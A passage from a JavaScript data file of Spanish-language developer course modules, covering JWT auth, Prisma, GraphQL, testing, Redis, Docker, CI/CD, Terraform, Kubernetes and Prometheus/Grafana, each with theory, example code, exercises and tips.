  { id: 'BA3', title: 'Autenticación JWT',     category: 'Backend y APIs',       activated: false, complexity: 2, prerequisites: ['BA2'],      related: [],          summary: 'Firmar tokens con jsonwebtoken. Ej.: jwt.sign({id}, secret, {exp:...}). Ejercicio: protege rutas privadas.',
    content: {
      theory: `
# JSON Web Tokens — Auth stateless

## 1. Estructura
\`header.payload.signature\` (Base64Url). HS256 por defecto.

## 2. Flujo
1. POST /login → firma token corto (15 min).  
2. Emite **refresh token** (httpOnly cookie 7 d).  
3. /refresh → nuevo access token, si refresh válido.  

## 3. Hardening
- Rotación de refresh (reuse detection).  
- Lista de revocación en Redis (jti).  
- Audience + issuer claims.
      `,
      examples: [
        {
          title: "🔐 Middleware verifyJWT",
          code: `module.exports = (roles=[]) => (req,res,next)=>{
  const token = req.headers.authorization?.split(' ')[1];
  if(!token) return res.sendStatus(401);
  jwt.verify(token, process.env.JWT_SECRET,(err,decoded)=>{
    if(err) return res.sendStatus(403);
    if(roles.length && !roles.includes(decoded.role)) return res.sendStatus(403);
    req.user = decoded;
    next();
  });
};`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Logout seguro",
          description: "Implementa endpoint que añade jti del access token a blacklist hasta exp."
        }
      ],
      resources: [
        { title: "📖 jwt.io Debugger", url: "https://jwt.io/", description: "Decodifica y verifica tokens" }
      ],
      tips: [
        "💡 Coloca el refresh token en Secure, SameSite=Lax cookie; nunca en localStorage.",
        "💡 Ajusta clockSkew ± 30 s para compensar drift servidor/cliente."
      ]
    }
  },
  { id: 'BA4', title: 'ORM con Prisma',        category: 'Backend y APIs',       activated: false, complexity: 3, prerequisites: ['BA2'],      related: [],          summary: 'Modelado declarativo y migraciones. Ej.: model Post {id Int @id @default(autoincrement())}. Ejercicio: agrega Postgres.',
    content: {
      theory: `
# Prisma ORM – Tipado de Base de Datos al IDE

## 1. Prisma Schema
\`\`\`prisma
model Post{
  id        Int      @id @default(autoincrement())
  title     String   @db.VarChar(200)
  body      String?
  author    User?    @relation(fields:[authorId],references:[id])
  authorId  Int?
  tags      Tag[]    @relation("PostTags")
  @@index([title])
}
\`\`\`

## 2. Migraciones automáticas
\`\`\`bash
npx prisma migrate dev --name init
\`\`\`

## 3. Database Pooling (pgBouncer)
\`\`\`js
const prisma = new PrismaClient({ datasources:{ db:{ url:process.env.PGB_URL } }});
\`\`\`

## 4. Transacciones "interactive"
\`\`\`js
await prisma.$transaction(async(tx)=>{
  const order = await tx.order.create({data: {...}});
  await tx.stock.update({ where:{id}, data:{ qty:{ decrement:1 } } });
});
\`\`\`
      `,
      examples: [
        {
          title: "🧩 Query agregada",
          code: `const topTags = await prisma.tag.findMany({
  take:5,
  orderBy:{ posts:{ _count:'desc' } },
  include:{ _count:{ select:{ posts:true } } }
});`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Seed Relacional",
          description: "Usa @faker-js para poblar 50 users, 200 posts, relación M-N con tags.",
          steps: [
            "1. Instala @faker-js/faker y configura seed.js",
            "2. Crea función createUsers() con datos falsos",
            "3. Establece relaciones M-N entre posts y tags",
            "4. Ejecuta npx prisma db seed"
          ]
        },
        {
          title: "🔬 Ex 2 — ACL a nivel fila",
          description: "Implementa función canEditPost(userId, postId) con prisma.$exists.",
          steps: [
            "1. Crea función canEditPost() en utils/permissions.js",
            "2. Usa prisma.post.findFirst() con condiciones de ownership",
            "3. Integra en middleware de rutas protegidas",
            "4. Prueba con usuarios diferentes"
          ]
        }
      ],
      resources: [
        { title: "📖 Prisma Docs", url: "https://www.prisma.io/docs/", description: "Documentación oficial y estupendos quickstarts" },
        { title: "📹 Next-level Prisma Patterns", url: "https://youtu.be/5D5YjM4E77A", description: "Charla sobre transacciones y performance" }
      ],
      tips: [
        "💡 Genera tipos con \`npx prisma generate\`; disfruta autocompletado.",
        "💡 Prefiere \`select\` para campos necesarios; reduce payload y ancho de banda."
      ]
    }
  },
  { id: 'BA5', title: 'GraphQL Basics',        category: 'Backend y APIs',       activated: false, complexity: 3, prerequisites: ['BA2'],      related: [],          summary: 'Schemas, resolvers, queries/mutations. Ejercicio: levanta Apollo Server.',
    exercises: [
      {
        title: "🚀 Sprint 1 — API Blog GraphQL (Query + Paginación Cursor)",
        objective: "Construir el endpoint 'posts' tipado y paginado para un blog.",
        deliverable: "PR con esquema .graphql, resolvers, script seed y tests Jest.",
        steps: [
          "1. Define types Post, User, Query.posts(connArgs).",
          "2. Implementa paginación cursor-based (first, after).",
          "3. Usa DataLoader para batch de author en <1 ms por llamada.",
          "4. Semilla 200 posts, 50 users con Faker.",
          "5. Asegura cobertura de tests ≥ 80 % en resolvers."
        ],
        acceptance: [
          "✅ Query 'posts(first:10)' devuelve edges + pageInfo con endCursor.",
          "✅ Lighthouse GraphQL tab muestra tiempo medio < 40 ms.",
          "✅ Tests 'posts pagination' pasan y mockean DataLoader."
        ],
        hint: "Reutiliza prisma.cursor para next-page y almacena último id.",
        extra: "Implementa filtro category:String con índices compuestos."
      },
      {
        title: "🔐 Sprint 2 — Directiva @auth(role)",
        objective: "Proteger mutaciones para roles ADMIN o EDITOR.",
        deliverable: "Custom directive + tests de denegación/permiso.",
        steps: [
          "1. Crea directiva @auth en schema SDL.",
          "2. Implementa AuthDirective transformer.",
          "3. Extrae role del JWT en context.",
          "4. Deniega acceso con error Apollo si rol insuficiente."
        ],
        acceptance: [
          "✅ Mutación 'createPost' devuelve 403 si token sin rol.",
          "✅ Cobertura role directive lines ≥ 90 %."
        ],
        hint: "Extiende context con user.role decodificando JWT."
      }
    ]
  },
  { id: 'BA6', title: 'Testing con Jest & Supertest',category: 'Backend y APIs', activated: false, complexity: 3, prerequisites: ['BA2'],      related: [],          summary: 'Pruebas de integración a endpoints. Ej.: request(app).get("/users").expect(200). Ejercicio: cobertura 80%.',
    exercises: [
      {
        title: "🧪 Caso Real — Ruta /notes con TDD",
        objective: "Cubrir ciclo CRUD completo con integración a SQLite in-memory.",
        deliverable: "Suite jest + supertest, cobertura global statements ≥ 85 %.",
        steps: [
          "1. Crea tabla notes(id,title,body,created_at).",
          "2. Implementa routes/notes.js con validación express-validator.",
          "3. Escribe test de happy-path y edge-cases (422, 404).",
          "4. Añade GitHub Action que ejecute 'npm test' en cada PR."
        ],
        acceptance: [
          "✅ 'npm test' verde local y en CI.",
          "✅ Archivo coverage/lcov-report index muestra ≥ 85 % (branches 75 %)."
        ],
        hint: "Usa sqlite3 :memory: y `beforeEach` para limpiar estado.",
        extra: "Mockea fallo DB y asegura código 500 + logger error track."
      }
    ]
  },
  { id: 'BA7', title: 'Caching con Redis',     category: 'Backend y APIs',       activated: false, complexity: 4, prerequisites: ['BA3'],      related: [],          summary: 'Cache‑aside pattern. Ej.: await redis.get(key) || fetchDB(). Ejercicio: acelera un endpoint lento.',
    exercises: [
      {
        title: "⚡ Task — Cache Aside para /products",
        objective: "Reducir TTFB de 250 ms a ≤ 80 ms usando Redis standalone.",
        deliverable: "Middleware cacheProducts.js + endpoint flush + test perf.",
        steps: [
          "1. Clave products:all JSON string con TTL 120 s.",
          "2. En cache MISS consulta DB, guarda clave y responde.",
          "3. Crea POST /cache/flush/products para invalidar.",
          "4. Benchmark con autocannon y documenta mejora."
        ],
        acceptance: [
          "✅ autocannon muestra p95 ≤ 100 ms tras warm-cache.",
          "✅ flush devuelve 204 y key inexistente luego.",
          "✅ Test jest verifica setEX y del llamados."
        ],
        hint: "Randomiza TTL (+-30 s) para evitar stampede.",
        extra: "Implementa tag-based invalidation con SET members."
      },
      {
        title: "🏆 Challenge — Leaderboard Tiempo Real",
        objective: "Crear ranking puntual con Sorted Set y publicar cambios vía Pub/Sub.",
        deliverable: "endpoint /score POST + SSE /live-board.",
        steps: [
          "1. Usa ZADD para scores y ZRANGE para ranking.",
          "2. PUBLISH score:updated con payload JSON.",
          "3. SSE endpoint se subscribe y reenvía.",
          "4. Cliente HTML actualiza tabla sin refresh."
        ],
        acceptance: ["✅ ZRANGE devuelve top 10 ordenado.", "✅ Cliente SSE recibe update < 1 s."]
      }
    ]
  },
  { id: 'BA8', title: 'Arquitectura Hexagonal',category: 'Backend y APIs',       activated: false, complexity: 5, prerequisites: ['BA4','BA6'], related: [],          summary: 'Separación dominio/adapters. Ej.: Ports & Adapters. Ejercicio: refactoriza microservicio.',
    exercises: [
      {
        title: "🏗️ Refactor — Microservicio Comments a Hexagonal",
        objective: "Extraer lógica dominio y hacerla testeable sin Express/DB.",
        deliverable: "Directorio domain/, use-case RegisterComment + InMemory adapter tests 100 %.",
        steps: [
          "1. Define Entity Comment con invariantes (body ≤ 500 chars).",
          "2. Interface CommentRepo (save, findByPost).",
          "3. Use-case RegisterComment ← validador spam.",
          "4. Adapters: PrismaCommentRepo, ExpressController.",
          "5. Tests jest domain pura < 50 ms."
        ],
        acceptance: [
          "✅ Domain tests no usan import prisma/express.",
          "✅ Cobertura dominio 100 %, adapter 60 %+."
        ],
        hint: "Inyección de dependencias en constructor use-case.",
        extra: "Añade EventPublisher y emite 'COMMENT_CREATED' para CQRS."
      }
    ]
  },

  {id: 'DC1', title: 'Git Basics',            category: 'DevOps & Cloud',       activated: true,  complexity: 1, prerequisites: [],          related: [],          summary: 'git init, add, commit, branch, merge. Ejercicio: flujo feature‑branch.',
    exercises: [
      {
        title: "🔧 Hands-on — Feature Branch y PR Limpio",
        objective: "Simular flujo GitHub Flow con squash antes de merge.",
        deliverable: "Repo demo con PR 'feat/login' mergeado en main.",
        steps: [
          "1. fork boilerplate, crea branch feat/login.",
          "2. 3 commits significativos (UI, lógica, test).",
          "3. `git rebase -i main` squash → 1 commit claro.",
          "4. push --force-with-lease, abre PR, pasa CI.",
          "5. Merge vía 'squash & merge'."
        ],
        acceptance: [
          "✅ Histórico main muestra un solo commit de la feature.",
          "✅ CI (lint + test) verde en PR.",
          "✅ PR descripción enlaza issue #ID."
        ],
        hint: "Configura `git config rebase.autosquash true` para agilizar."
      },
      {
        title: "🕵️‍♂️ Recovery — Reescribir Historia Segura",
        objective: "Revertir merge erróneo usando reflog en local y push --force.",
        deliverable: "Repo limpio sin commits problemáticos.",
        steps: [
          "1. Identifica HEAD@{n} antes del merge con `git reflog`.",
          "2. `git reset --hard` a esa referencia.",
          "3. `git push --force-with-lease origin main`.",
          "4. Verifica que CI vuelve a verde."
        ],
        acceptance: ["✅ Historia limpia, commit problemático ausente."]
      }
    ]
  },
/* ────────── DC2 – Docker Fundamentals ────────── */
{
  id: 'DC2',
  title: 'Docker Fundamentals',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 2,
  prerequisites: ['DC1'],
  related: [],
  summary: 'Dockerfile, imágenes y contenedores. Ej.: FROM node:20-alpine. Ejercicio: dockeriza tu API.',
  content: {
    theory: `
# Docker Fundamentals — De «works on my machine» a imágenes inmutables

## 1. Arquitectura
- **Daemon (dockerd)**: administra contenedores, imágenes, redes, volúmenes.  
- **CLI / API REST**: interfaz de usuario.  
- **Sandbox**: cgroups + namespaces (aislamiento) + overlayfs (capas COW).

## 2. Ciclo de vida imagen → contenedor  
\\\`\\\`\\\`
Dockerfile → docker build → <image> → docker run → <container>
\\\`\\\`\\\`

## 3. Dockerfile Pro
| Instrucción | Buen uso |
|-------------|----------|
| **FROM**    | Usa imágenes oficiales *-alpine* donde aplique |
| **COPY**    | Copia solo package.json–lock para aprovechar capas |
| **RUN**     | Combina comandos con \`&&\` y limpia caches |
| **HEALTHCHECK** | Exponer endpoint \`/health\` para orquestadores |
| **ENTRYPOINT**  | Script *PID 1* + \`exec "$@"\` para señales |

### Ejemplo multi-stage  
\\\`\\\`\\\`dockerfile
FROM node:20-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:20-alpine
WORKDIR /app
COPY --from=build /app/dist ./dist
CMD ["node","dist/index.js"]
\\\`\\\`\\\`

## 4. Registry & etiquetas
\`docker tag api:1.0 ghcr.io/org/api:1.0\` → \`docker push\`  
SemVer + \`latest\` ≠ producción segura; usa tags inmutables + digest.

## 5. Debug & slim
- **dive**: inspecciona capas y bytes desperdiciados.  
- **hadolint**: linter de buenas prácticas en CI.
    `,
    examples: [
      {
        title: '🚑 Node API con HEALTHCHECK',
        code: `# Dockerfile
FROM node:20-alpine
WORKDIR /usr/src/app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .
HEALTHCHECK --interval=30s --timeout=3s CMD wget -qO- http://localhost:3000/health || exit 1
CMD ["node","server.js"]`
      },
      {
        title: '🪄 Build de imagen en menos de 30 s',
        code: `# Usa BuildKit y cache mounts
RUN --mount=type=cache,target=/root/.npm npm ci --omit=dev`
      }
    ],
    exercises: [
      {
        title: '🚀 Ex 1 — Dockerizar API Express',
        objective: 'Generar imagen producción < 200 MB con multi-stage y healthcheck.',
        deliverable: 'Dockerfile + README con comandos build/run.',
        steps: [
          '1. Base node:20-alpine, directorio /app.',
          '2. Copia solo package.json y package-lock.json, ejecuta npm ci.',
          '3. Añade healthcheck a /health (debe responder 200).',
          '4. Publica imagen en GHCR con tag semver 0.1.0.'
        ],
        acceptance: [
          '✅ “docker images” muestra SIZE ≤ 200 MB.',
          '✅ “docker run -d -p 3000:3000 api” y /health responde OK.',
          '✅ Imagen accesible en ghcr.io/<org>/api:0.1.0@sha256:…'
        ],
        hint: 'Activa BuildKit con DOCKER_BUILDKIT=1.',
        extra: 'Integra hadolint en pre-push hook.'
      },
      {
        title: '🔬 Ex 2 — Analizar capas con dive',
        objective: 'Reducir wasted space a < 5 %.',
        deliverable: 'Captura dive + PR con capas optimizadas.'
      }
    ],
    resources: [
      { title: '📖 Docker Docs — Best practices', url: 'https://docs.docker.com/develop/develop-images/dockerfile_best-practices/', description: 'Guía oficial de Dockerfile pro' },
      { title: '🛠️ hadolint', url: 'https://github.com/hadolint/hadolint', description: 'Linter de Dockerfile con reglas robustas' },
      { title: '🕵️ dive', url: 'https://github.com/wagoodman/dive', description: 'Explorador de capas para encontrar bloat' }
    ],
    tips: [
      '💡 Usa .dockerignore para excluir node_modules y tests.',
      '💡 No ejecutes npm install -g dentro de imagen final: rompe reproducibilidad.',
      '💡 Siempre fija UID/GID no-root (e.g., USER node).'
    ]
  }
},

/* ────────── DC3 – Docker Compose ────────── */
{
  id: 'DC3',
  title: 'Docker Compose',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 2,
  prerequisites: ['DC2'],
  related: [],
  summary: 'Orquestar multi-servicio local. Ej.: services: api, db. Ejercicio: stack Node+Postgres.',
  content: {
    theory: `
# Docker Compose v2 — Orquestación local declarativa

## 1. Estructura YAML 3.9+
\\\`\\\`\\\`yaml
services:
  api:
    build: .
    depends_on:
      db:
        condition: service_healthy
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: secret
\\\`\\\`\\\`

## 2. Redes & Volúmenes
- Cada archivo crea red por defecto **<project>_default**.  
- Declara volumen nombrado para persistencia:
  \`volumes: pgdata:\`

## 3. Variables y override
\`compose.yaml\` + \`compose.override.yaml\` (dev) → se fusionan.  
\`docker compose --env-file .env.dev up -d\`

## 4. Healthchecks y wait-for-it
Compose v2 permite \`condition: service_healthy\` sin scripts externos.

## 5. Profiles
Activa servicios opcionales (p.ej. mailhog, redis) con \`--profile dev\`.
    `,
    examples: [
      {
        title: '🗄️ Stack Node + Postgres',
        code: `version: "3.9"
services:
  api:
    build: .
    ports: ["3000:3000"]
    environment:
      DATABASE_URL: postgres://postgres:secret@db:5432/app
    depends_on:
      db:
        condition: service_healthy
    command: ["npm","run","start"]
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: secret
      POSTGRES_DB: app
    volumes: ["pgdata:/var/lib/postgresql/data"]
    healthcheck:
      test: ["CMD-SHELL","pg_isready -U postgres"]
      interval: 5s
      retries: 5
volumes:
  pgdata:`
      },
      {
        title: '👩‍💻 compose.override.yaml (dev)',
        code: `services:
  api:
    environment:
      NODE_ENV: development
    volumes:
      - .:/app
    command: ["npm","run","dev"]`
      }
    ],
    exercises: [
      {
        title: '🚀 Ex 1 — Levantar API + DB + Adminer',
        objective: 'Stack listo en dos comandos para onboarding junior.',
        deliverable: 'compose.yaml con api, postgres, adminer.',
        steps: [
          '1. Crea servicio adminer en puerto 8080.',
          '2. Usa variable POSTGRES_PASSWORD en .env.',
          '3. Healthcheck db; api depende healthy.',
          '4. README con \`docker compose up -d\`.'
        ],
        acceptance: [
          '✅ “docker compose ps” muestra 3 servicios up.',
          '✅ Navegar http://localhost:8080 y loggear en DB.',
          '✅ api GET /health devuelve 200.'
        ],
        hint: 'Adminer imagen: adminer:4-fpm-alpine.',
        extra: 'Añade profile “dev” con pgweb.'
      },
      {
        title: '🔬 Ex 2 — Hot-reload con volumes',
        objective: 'Editar código host y ver live-reload en contenedor.',
        deliverable: 'Override YAML + video/screencast GIF.'
      }
    ],
    resources: [
      { title: '📖 Compose Spec', url: 'https://compose-spec.io/', description: 'Especificación oficial y extendida' },
      { title: '🛠️ wait-for-it.sh', url: 'https://github.com/vishnubob/wait-for-it', description: 'Script de sincronización clásica' }
    ],
    tips: [
      '💡 Evita links: (legacy); usa redes y nombres DNS automáticos.',
      '💡 Usa docker compose cp para copiar archivos en servicios en vivo.',
      '💡 Desactiva build cache con --no-cache solo en casos excepcionales.'
    ]
  }
},

/* ────────── DC4 – CI/CD con GitHub Actions ────────── */
{
  id: 'DC4',
  title: 'CI/CD con GitHub Actions',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 3,
  prerequisites: ['DC1'],
  related: [],
  summary: 'workflows yaml para test & deploy. Ejercicio: pipeline push → test.',
  content: {
    theory: `
# GitHub Actions — De commit a producción en minutos

## 1. Conceptos clave
- **Workflow**: archivo YAML en \`.github/workflows/\`.
- **Job**: grupo de steps en runner (ubuntu-latest, self-hosted).
- **Step**: acción o comando.  
- **Matrix**: combinaciones Node LTS, OS, DB.

## 2. Caché y artefactos
\\\`\\\`\\\`yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: \${{ runner.os }}-npm-\${{ hashFiles('package-lock.json') }}
\\\`\\\`\\\`

## 3. Seguridad
- **OIDC**: autenticación sin secrets hacia AWS/GCP.  
- **Environment protection rules** + reviewers para despliegue production.

## 4. Reusable workflows  
\`uses: org/.github/.workflows/docker-build.yml@v2\` → DRY entre microservicios.

## 5. Deploy strategies
| Estrategia | Acción |
|------------|--------|
| **Push + Docker** | ghcr.io + \`docker push\` |
| **Serverless** | \`aws-actions/configure-aws-credentials\` + \`sam deploy\` |
| **Static** | \`actions/upload-pages-artifact\` + \`github-pages\` |
    `,
    examples: [
      {
        title: '✅ Node CI (lint + test + ESBuild)',
        code: `name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npm ci
      - run: npm run lint
      - run: npm test -- --coverage
      - uses: actions/upload-artifact@v3
        with: { name: coverage, path: coverage }`
      },
      {
        title: '🚀 Docker Build & Push (GHCR) con OIDC',
        code: `name: Build-and-Push
on:
  push:
    branches: [main]
jobs:
  docker:
    permissions: { packages: write, id-token: write }
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with: { registry: ghcr.io }
      - uses: docker/build-push-action@v5
        with:
          push: true
          tags: ghcr.io/org/api:\${{ github.sha }}`
      }
    ],
    exercises: [
      {
        title: '🚀 Ex 1 — Pipeline de Test en Pull Request',
        objective: 'Bloquear merge si lint o tests fallan.',
        deliverable: 'workflow pr-ci.yml con badge README.',
        steps: [
          '1. Evento: pull_request targeting main.',
          '2. Jobs: install, lint (eslint), test (jest).',
          '3. Cache npm; subir cobertura artefacto.',
          '4. Badge en README con estado build.'
        ],
        acceptance: [
          '✅ PR con test rojo marca check rojo y bloquea merge.',
          '✅ Coverage artifact accesible en run.',
          '✅ README badge refleja status (shields.io).'
        ],
        hint: 'Protege rama main “Require status checks” en Settings.',
        extra: 'Agrega job “type-check” con TypeScript --noEmit.'
      },
      {
        title: '🔄 Ex 2 — Deploy Continuo Docker → Render.com',
        objective: 'Imagen GHCR triggerea deploy webhook Render.',
        deliverable: 'Job deploy y secret RENDER_WEBHOOK_URL.',
        steps: [
          '1. Tras push de imagen, curl -X POST $URL.',
          '2. Usa secrets.RENDER_WEBHOOK_URL.',
          '3. Solo en branch main y tag v*.*.*.'
        ],
        acceptance: [
          '✅ Deploy Render arranca y API /health responde 200.',
          '✅ Job marca succeeded; link en summary.'
        ]
      }
    ],
    resources: [
      { title: '📖 Actions Docs', url: 'https://docs.github.com/actions', description: 'Referencia completa de sintaxis' },
      { title: '🛠️ setup-node action', url: 'https://github.com/actions/setup-node', description: 'Instalador de versiones Node + caching' },
      { title: '🔑 OIDC Guide', url: 'https://docs.github.com/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect', description: 'Autenticación federada sin secrets' }
    ],
    tips: [
      '💡 Habilita pull-request-target con cuidado: no secrets en forks.',
      '💡 Usa actions-rs/toolchain para matrices Rust.',
      '💡 Divide jobs en test / build / deploy; cache solo donde ayuda.'
    ]
  }
},

  /* ────────── DC5 – Infra as Code (Terraform) (Complejidad 3) ────────── */
{
  id: 'DC5',
  title: 'Infra as Code (Terraform)',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 3,
  prerequisites: ['DC2'],
  related: [],
  summary: 'Recursos declarativos AWS. Ej.: resource "aws_s3_bucket". Ejercicio: bucket estático.',
  content: {
    theory: `
# Terraform — Infraestructura Declarativa y Reutilizable

## 1. Principios Básicos
- **Configuración** en HCL, idempotente: \`terraform apply\` crea sólo cambios necesarios.  
- **State**: archivo local o remote (S3 + DynamoDB) que guarda referencias de recursos.  
- **Providers**: plugins que exponen recursos (AWS, Azure, Google).

## 2. Estructura de un Proyecto
\`\`\`
.
├── main.tf      # configuración principal
├── variables.tf # entradas parametrizables
├── outputs.tf   # salidas útiles
└── terraform.tfvars # valores de variables
\`\`\`

## 3. Ciclo de Vida
1. \`terraform init\` → instala providers, backend  
2. \`terraform plan\` → muestra cambios  
3. \`terraform apply\` → aplica infraestructura  
4. \`terraform destroy\` → limpia recursos

## 4. Módulos & Workspaces
- **Módulos**: carpetas reutilizables (e.g., \`module "vpc"\`).  
- **Workspaces**: entornos aislados (dev, prod) con un mismo código.

## 5. Backends Remotos
Configure S3 + DynamoDB:
\`\`\`hcl
terraform {
  backend "s3" {
    bucket         = "tf-state-bucket"
    key            = "project/terraform.tfstate"
    region         = "us-east-1"
    dynamodb_table = "tf-locks"
  }
}
\`\`\``,
    examples: [
      {
        title: '🌐 Módulo de S3 Bucket con versión estática',
        code: `// modules/s3/static_website/main.tf
resource "aws_s3_bucket" "site" {
  bucket = var.bucket_name
  acl    = "public-read"
  website {
    index_document = "index.html"
    error_document = "404.html"
  }
}
output "website_url" {
  value = aws_s3_bucket.site.website_endpoint
}`      },
      {
        title: '🔧 Root Configuration',
        code: `// main.tf
provider "aws" {
  region = var.aws_region
}
module "static_site" {
  source      = "./modules/s3/static_website"
  bucket_name = var.site_bucket
}`
      }
    ],
    exercises: [
      {
        title: '🏗️ Ex 1 — Bucket Web Estático',
        objective: 'Provisionar un sitio estático S3 con versión, index & error.',
        deliverable: 'Carpeta modules/s3/static_website + main.tf de root.',
        steps: [
          '1. Crea variables bucket_name, aws_region.',
          '2. Usa módulo local para crear bucket público con hosting.',
          '3. Añade versioning y lifecycle para archivos *.html.',
          '4. Configura backend S3+DynamoDB para state remoto.'
        ],
        acceptance: [
          '✅ terraform plan/apply sin errores.',
          '✅ Navegar URL proveída por output → sitio carga.',
          '✅ State file en S3 y lock en DynamoDB funcionan.'
        ],
        hint: 'Activa versioning con \`versioning { enabled = true }\`.',
        extra: 'Añade CloudFront delante del bucket para caché global.'
      },
      {
        title: '🔄 Ex 2 — Múltiples Workspaces',
        objective: 'Separar infra dev/prod reutilizando mismo código.',
        deliverable: 'Terraform workspaces dev & prod + tfvars correspondientes.',
        acceptance: [
          '✅ terraform workspace select dev/prod cambia bucket key.',
          '✅ Ambos entornos coexisten sin colisión de state.'
        ]
      }
    ],
    resources: [
      { title: '📖 Terraform Docs', url: 'https://www.terraform.io/docs', description: 'Referencia oficial de HCL y providers' },
      { title: '🛠️ Terraform Registry', url: 'https://registry.terraform.io/', description: 'Módulos community y oficiales' }
    ],
    tips: [
      '💡 Usa version constraints (“~> 4.0”) en providers para reproducibilidad.',
      '💡 Revisa terraform fmt y validate en CI para mantener calidad.',
      '💡 En entornos sensibles, activa “prevent_destroy” en lifecycle.'
    ]
  }
},

/* ────────── DC6 – Kubernetes Basics (Complejidad 4) ────────── */
{
  id: 'DC6',
  title: 'Kubernetes Basics',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 4,
  prerequisites: ['DC3'],
  related: [],
  summary: 'Pods, Deployments, Services. Ejercicio: k3d cluster local.',
  content: {
    theory: `
# Kubernetes — Orquestación de Contenedores

## 1. Componentes Fundamentales
- **Pod**: unidad mínima (uno o varios contenedores).  
- **Deployment**: replica pods declarativamente, maneja rollouts.  
- **Service**: abre IP estable + balanceo (ClusterIP, NodePort, LoadBalancer).  
- **ConfigMap & Secret**: configuración externa y datos sensibles.

## 2. Declaraciones YAML
\`\`\`yaml
apiVersion: apps/v1
kind: Deployment
metadata: { name: nginx-deploy }
spec:
  replicas: 3
  selector: { matchLabels: { app: nginx } }
  template:
    metadata: { labels: { app: nginx } }
    spec:
      containers:
        - name: nginx
          image: nginx:1.24
\`\`\`

\`\`\`yaml
kind: Service
apiVersion: v1
metadata: { name: nginx-svc }
spec:
  type: ClusterIP
  selector: { app: nginx }
  ports: [{ port: 80, targetPort: 80 }]
\`\`\`

## 3. k3d Local
- **k3d**: cluster k3s en Docker  
\`k3d cluster create mycluster --agents 2\`

## 4. Rollouts y Probes
- **RollingUpdate** por defecto  
- **livenessProbe** y **readinessProbe** para salud de pods  
    `,
    examples: [
      {
        title: '🚀 k3d Cluster + nginx',
        code: `# crea cluster
k3d cluster create dev --agents 2
# despliega
kubectl apply -f deployment.yaml
kubectl apply -f service.yaml`
      },
      {
        title: '🔍 Probes en Deployment',
        code: `livenessProbe:
  httpGet: { path: /health, port: 8080 }
  initialDelaySeconds: 10
  periodSeconds: 5`
      }
    ],
    exercises: [
      {
        title: '🏅 Ex 1 — Cluster k3d con 3 Nodos',
        objective: 'Levantar cluster local y desplegar app de prueba.',
        deliverable: 'Scripts bash create-cluster.sh + manifests YAML.',
        steps: [
          '1. Instala k3d y kubectl.',
          '2. crea cluster con 1 server + 2 agents.',
          '3. Despliega Deployment + Service de tu app Node.',
          '4. Verifica con kubectl get pods, services.'
        ],
        acceptance: [
          '✅ 3 pods Running, Service ClusterIP accesible via kubectl port-forward.',
          '✅ Rolling update sin downtime al cambiar image tag.'
        ],
        hint: 'Usa imagePullPolicy: IfNotPresent en desarrollo.',
        extra: 'Configura Horizontal Pod Autoscaler para replicas dinámicas.'
      }
    ],
    resources: [
      { title: '📖 Kubernetes Docs', url: 'https://kubernetes.io/docs/home/', description: 'Guía y referencia oficial' },
      { title: '🛠️ k3d', url: 'https://k3d.io/', description: 'k3s en Docker para local dev' }
    ],
    tips: [
      '💡 Siempre etiqueta pods para facilitar service discovery.',
      '💡 Usa Namespaces para aislar entornos (dev, test, prod).'
    ]
  }
},

/* ────────── DC7 – Observabilidad (Prometheus + Grafana) (Complejidad 4) ────────── */
{
  id: 'DC7',
  title: 'Observabilidad (Prom + Grafana)',
  category: 'DevOps & Cloud',
  activated: false,
  complexity: 4,
  prerequisites: ['DC6'],
  related: [],
  summary: 'Exporters, alerting, dashboards. Ejercicio: métrica custom.',
  content: {
    theory: `
# Observabilidad — Métricas, Logs y Traces

## 1. Prometheus Core
- **Scrape**: periodic pull de /metrics endpoints.  
- **Time-series DB**: etiquetas (labels) permiten slicing.  
- **PromQL**: lenguaje para consultas (e.g., rate(http_requests_total[5m])).

## 2. Exporters
- **node_exporter** para métricas de host.  
- **blackbox_exporter** para chequear endpoints HTTP/TCP.  
- **custom**: client libraries (Go, Python, JS).

## 3. Alertmanager
Define reglas de alerta:
\`\`\`yaml
groups:
- name: app.rules
  rules:
  - alert: HighErrorRate
    expr: rate(http_requests_total{status=~"5.."}[2m]) > 0.05
    for: 5m
    labels: { severity: page }
    annotations: { summary: "5xx >5%" }
\`\`\`

## 4. Grafana Dashboards
- Paneles JSON exportables.  
- Variables y templating para reutilizar dashboards.  
    `,
    examples: [
      {
        title: '⚙️ Prometheus k8s scrape',
        code: `# prometheus.yml
scrape_configs:
  - job_name: 'node'
    static_configs:
      - targets: ['node1:9100','node2:9100']`
      },
      {
        title: '📊 Grafana Panel JSON snippet',
        code: `{
  "type": "graph",
  "targets": [{ "expr": "rate(http_requests_total[1m])", "legendFormat": "{{method}}"}]
}`
      }
    ],
    exercises: [
      {
        title: '📈 Ex 1 — Dashboard de Latencia HTTP',
        objective: 'Crear panel que muestre p95 de latencia de tu API.',
        deliverable: 'JSON de dashboard + query PromQL.',
        steps: [
          '1. Expón /metrics en tu app con histogram.',
          '2. Configura Prometheus scrape de la app.',
          '3. En Grafana crea panel con query histogram_quantile(0.95, sum(rate(http_request_duration_seconds_bucket[5m])) by (le)).',
          '4. Añade variable de service y env para filtrar.'
        ],
        acceptance: [
          '✅ Dashboard muestra p95 < 200 ms bajo carga normal.',
          '✅ Panel funciona al filtrar por service=“api”.'
        ],
        hint: 'Usa histograms en lugar de summaries para agregaciones.',
        extra: 'Define AlertRule que dispare si p95 > 500 ms por 10m.'
      }
    ],
    resources: [
      { title: '📖 Prometheus Docs', url: 'https://prometheus.io/docs/', description: 'Referencia oficial y guías' },
